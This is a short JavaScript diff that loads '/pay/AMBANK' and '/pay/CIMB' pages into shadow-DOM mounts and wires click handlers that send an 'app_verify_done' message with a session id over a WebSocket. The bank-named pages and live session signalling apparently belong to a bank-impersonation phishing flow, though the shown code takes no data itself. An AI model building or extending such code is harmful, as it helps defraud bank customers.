@@ -2726,14 +2726,50 @@ async function loadPage(pagePath, mountId) {
         (async () => {
 
     await loadPage('/pay/AMBANK', 'mount1');
+    const shadow1 = document.querySelector("#mount1").shadowRoot;
+    shadow1
+        .querySelector("#formactions > a > div")
+        .addEventListener('click', CustomizationappVerifyContinue1);
 
-    const shadow = document.querySelector("#mount1").shadowRoot;
+    await loadPage('/pay/CIMB', 'mount2');
+    const shadow2 = document.querySelector("#mount2").shadowRoot;
+    shadow2
+        .querySelector("#formactions > a > div")
+        .addEventListener('click', CustomizationappVerifyContinue2);
 
-    shadow
-        .querySelector("#formactions > a:nth-child(2) > div")
-        .addEventListener('click', appVerifyContinue);
+
+
+
 
 })();
+
+
+
+function CustomizationappVerifyContinue1() {
+                document.querySelector("#mount1").shadowRoot.querySelector("div > div").style.display = 'flex';
+                document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.remove('hidden');
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }
+
+function CustomizationappVerifyContinue2() {
+                document.querySelector("#mount2").shadowRoot.querySelector("div > div").style.display = 'flex';
+                document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.remove('hidden');
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }            
+
+
             </script>
 
 
